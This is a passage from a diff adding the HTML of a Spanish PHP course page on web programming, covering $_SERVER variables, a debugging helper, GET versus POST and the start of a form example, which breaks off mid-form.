@@ -1,0 +1,2085 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://elblo.github.io/dwes2526/04web.html">
+      
+      
+        <link rel="prev" href="03phpoo.html">
+      
+      
+        <link rel="next" href="05herramientas.html">
+      
+      
+        
+      
+      
+      <link rel="icon" href="imagenes/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>4.- Programación Web - Desarrollo Web en Entorno Servidor</title>
+      
+    
+    
+      <link rel="stylesheet" href="assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="light-blue" data-md-color-accent="Teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#programacion-web" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="index.html" title="Desarrollo Web en Entorno Servidor" class="md-header__button md-logo" aria-label="Desarrollo Web en Entorno Servidor" data-md-component="logo">
+      
+  <img src="imagenes/logoies.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Desarrollo Web en Entorno Servidor
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              4.- Programación Web
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="light-blue" data-md-color-accent="Teal"  aria-label="Cambiar a modo noche"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo noche" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="Teal"  aria-label="Cambiar a modo día"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo día" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="index.html" title="Desarrollo Web en Entorno Servidor" class="md-nav__button md-logo" aria-label="Desarrollo Web en Entorno Servidor" data-md-component="logo">
+      
+  <img src="imagenes/logoies.png" alt="logo">
+
+    </a>
+    Desarrollo Web en Entorno Servidor
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Inicio
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="01arquitecturas.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1.- Arquitecturas Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="02php.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2.- El lenguaje PHP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="03phpoo.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.- PHP Orientado a Objetos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.- Programación Web
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="04web.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.- Programación Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#41-variables-de-servidor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 Variables de servidor
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#42-formularios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 Formularios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.2 Formularios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#validacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Validación
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#parametro-multivalor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Parámetro multivalor
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#volver-a-rellenar-un-formulario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Volver a rellenar un formulario
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#subir-archivos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Subir archivos
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#43-cabeceras-de-respuesta" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 Cabeceras de respuesta
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#44-gestion-del-estado" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.4 Gestión del estado
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.4 Gestión del estado">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cookies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookies
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sesion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sesión
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#45-autentificacion-de-usuarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.5 Autentificación de usuarios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.5 Autentificación de usuarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basada-en-sesiones" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basada en sesiones
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#otros-mecanismos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Otros mecanismos
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#robos-de-sesion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Robos de sesión
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#46-resumen" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.6 Resumen
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.6 Resumen">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#i-datos-y-peticiones-41-42" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        I. Datos y Peticiones (4.1, 4.2)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ii-comunicacion-y-estado-43-44" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        II. Comunicación y Estado (4.3, 4.4)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iii-seguridad-y-autentificacion-45" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        III. Seguridad y Autentificación (4.5)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#47-referencias" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.7 Referencias
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#48-actividades" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.8 Actividades
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.8 Actividades">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#variables-de-servidor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Variables de servidor
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#formularios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Formularios
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cabeceras" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cabeceras
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookies-y-sesion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookies y Sesión
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#autenticacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Autenticación
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proyecto-videoclub-30" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Proyecto Videoclub 3.0
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="05herramientas.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5.- Herramientas Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="06accesoDatos.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.- Acceso a Datos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="07frameworks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.- Frameworks PHP - Laravel
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="08laravelDatos.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8.- Gestión de datos en Laravel
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="09laravelAvanzado.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.- Laravel Avanzado
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="10laravelAutenticacion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10.- Autenticación y autorización
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="11laravelAPI.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11.- Servicios REST
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="programacion-web">Programación Web<a class="headerlink" href="#programacion-web" title="Permanent link">&para;</a></h1>
+<details class="abstract">
+<summary>Duración y criterios de evaluación</summary>
+<p>Duración estimada: 12 sesiones</p>
+<hr />
+<table>
+<thead>
+<tr>
+<th>Resultado de aprendizaje</th>
+<th>Criterios de evaluación</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4. Desarrolla aplicaciones Web embebidas en lenguajes de marcas analizando e incorporando funcionalidades según especificaciones.</td>
+<td>a) Se han identificado los mecanismos disponibles para el mantenimiento de la información que concierne a un cliente web concreto y se han señalado sus ventajas.<br /> b) Se han utilizado sesiones para mantener el estado de las aplicaciones Web. <br /> c) Se han utilizado <em>cookies</em> para almacenar información en el cliente Web y para recuperar su contenido. <br /> d) Se han identificado y caracterizado los mecanismos disponibles para la autentificación de usuarios. <br /> e) Se han escrito aplicaciones que integren mecanismos de autentificación de usuarios. <br /> f) Se han realizado adaptaciones a aplicaciones Web existentes como gestores de contenidos u otras. <br /> g) Se han utilizado herramientas y entornos para facilitar la programación, prueba y depuración del código.</td>
+</tr>
+</tbody>
+</table>
+</details>
+<h2 id="41-variables-de-servidor">4.1 Variables de servidor<a class="headerlink" href="#41-variables-de-servidor" title="Permanent link">&para;</a></h2>
+<p>PHP almacena la información del servidor y de las peticiones HTTP en seis arrays globales:</p>
+<ul>
+<li><code>$_ENV</code>: información sobre las variables de entorno</li>
+<li><code>$_GET</code>: parámetros enviados en la petición GET</li>
+<li><code>$_POST</code>: parámetros enviados en el envio POST</li>
+<li><code>$_COOKIE</code>: contiene las cookies de la petición, las claves del array son los nombres de las <em>cookies</em></li>
+<li><code>$_SERVER</code>: información sobre el servidor</li>
+<li><code>$_FILES</code>: información sobre los ficheros cargados via upload</li>
+</ul>
+<div class="admonition info">
+<p class="admonition-title">URL y URI</p>
+<p>Antes de continuar es necesario aclarar las diferencias entre URL y URI. La <a href="https://developer.mozilla.org/es/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL">URL</a> (Uniform Resource Locator) indica la localización donde se encuentran los recursos, mientras que la <a href="https://developer.mozilla.org/es/docs/Glossary/URI">URI</a> (Uniform Resource Identifier) identifica a un recurso en sí.
+<figure style="align: center;">
+    <img src="imagenes/04/04urluri.jpg">
+    <figcaption>Diferencias entre URL y URI</figcaption>
+</figure></p>
+</div>
+<p>Si nos centramos en el array <code>$_SERVER</code> podemos consultar las siguientes propiedades:</p>
+<ul>
+<li><code>PHP_SELF</code>: nombre del script ejecutado, relativo al document root (p.ej: <code>/tienda/carrito.php</code>)</li>
+<li><code>SERVER_SOFTWARE</code>: (p.ej: Apache)</li>
+<li><code>SERVER_NAME</code>: dominio, alias DNS (p.ej: <code>www.elche.es</code>)</li>
+<li><code>REQUEST_METHOD</code>: GET</li>
+<li><code>REQUEST_URI</code>: URI, sin el dominio</li>
+<li><code>QUERY_STRING</code>: todo lo que va después de <code>?</code> en la URL (p.ej: <code>heroe=Batman&amp;nombre=Bruce</code>)</li>
+</ul>
+<p>Más información en <a href="https://www.php.net/manual/es/reserved.variables.server.php">https://www.php.net/manual/es/reserved.variables.server.php</a></p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span><span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_SELF&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span> <span class="c1">// /u4/401server.php</span>
+<span class="linenos" data-linenos="3 "></span><span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_SOFTWARE&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span> <span class="c1">// Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9</span>
+<span class="linenos" data-linenos="4 "></span><span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span> <span class="c1">// localhost</span>
+<span class="linenos" data-linenos="5 "></span>
+<span class="linenos" data-linenos="6 "></span><span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span> <span class="c1">// GET</span>
+<span class="linenos" data-linenos="7 "></span><span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_URI&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span> <span class="c1">// /u4/401server.php?heroe=Batman</span>
+<span class="linenos" data-linenos="8 "></span><span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;QUERY_STRING&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span> <span class="c1">// heroe=Batman</span>
+</code></pre></div>
+<p>Otras propiedades relacionadas:</p>
+<ul>
+<li><code>PATH_INFO</code>: ruta extra tras la petición. Si la URL es <code>http://www.php.com/php/pathInfo.php/algo/cosa?foo=bar</code>, entonces <code>$_SERVER['PATH_INFO']</code> será <code>/algo/cosa</code>.</li>
+<li><code>REMOTE_HOST</code>: hostname que hizo la petición</li>
+<li><code>REMOTE_ADDR</code>: IP del cliente</li>
+<li><code>AUTH_TYPE</code>: tipo de autenticación (p.ej: Basic)</li>
+<li><code>REMOTE_USER</code>: nombre del usuario autenticado</li>
+</ul>
+<p>Apache crea una clave para cada cabecera HTTP, en mayúsculas y sustituyendo los guiones por subrayados:</p>
+<ul>
+<li><code>HTTP_USER_AGENT</code>: agente (navegador)</li>
+<li><code>HTTP_REFERER</code>: página desde la que se hizo la petición</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span><span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span> <span class="c1">// Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span>
+</code></pre></div>
+<details class="tip">
+<summary>Crear función propia dd</summary>
+<p>En Laravel es bastante común utilizar la función <strong>dd</strong> --dump and die-- que muestra información de la variable pasada y corta la ejecución del script actual. Muy útil para realizar depuración y pruebas. </p>
+<p>Una implementación propia de la función sería la siguiente:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span><span class="k">function</span> <span class="nf">dd</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 3 "></span>    <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos=" 4 "></span>    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+<span class="linenos" data-linenos=" 5 "></span>    <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos=" 6 "></span>    <span class="k">die</span><span class="p">();</span>
+<span class="linenos" data-linenos=" 7 "></span><span class="p">}</span>
+<span class="linenos" data-linenos=" 8 "></span>
+<span class="linenos" data-linenos=" 9 "></span><span class="c1">// llamada con la supervariable $_SERVER</span>
+<span class="linenos" data-linenos="10 "></span><span class="nx">dd</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">);</span>
+</code></pre></div>
+</details>
+<h2 id="42-formularios">4.2 Formularios<a class="headerlink" href="#42-formularios" title="Permanent link">&para;</a></h2>
+<p>A la hora de enviar un formulario, debemos tener claro cuando usar GET o POST:</p>
+<ul>
+<li>
+<p>GET: los parámetros se pasan en la URL</p>
+<ul>
+<li>&lt;2048 caracteres, sólo ASCII</li>
+<li>Permite almacenar en marcadores/historial la dirección completa</li>
+<li>Idempotente: dos llamadas con los mismos datos siempre debe dar el mismo resultado</li>
+<li>El navegador puede cachear las llamadas</li>
+</ul>
+</li>
+<li>
+<p>POST: parámetros ocultos (no encriptados)</p>
+<ul>
+<li>Sin límite de datos, permite datos binarios</li>
+<li>No se pueden cachear</li>
+<li>No idempotente → actualizar la BBDD</li>
+</ul>
+</li>
+</ul>
+<p>Así pues, para recoger los datos accederemos al array dependiendo del método del formulario que nos ha invocado:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span><span class="nv">$par</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;parametro&quot;</span><span class="p">]</span>
+<span class="linenos" data-linenos="3 "></span><span class="nv">$par</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;parametro&quot;</span><span class="p">]</span>
+</code></pre></div>
+<p>Para los siguientes apartados nos vamos a basar en el siguiente ejemplo:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;formulario.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 2 "></span>    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;nombre&quot;</span><span class="p">&gt;</span>Nombre del alumno:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 3 "></span>        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;nombre&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;nombre&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos=" 4 "></span>    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 5 "></span>
+<span class="linenos" data-linenos=" 6 "></span>    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;checkbox&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;modulos[]&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;modulosDWES&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;DWES&quot;</span> <span class="p">/&gt;</span>
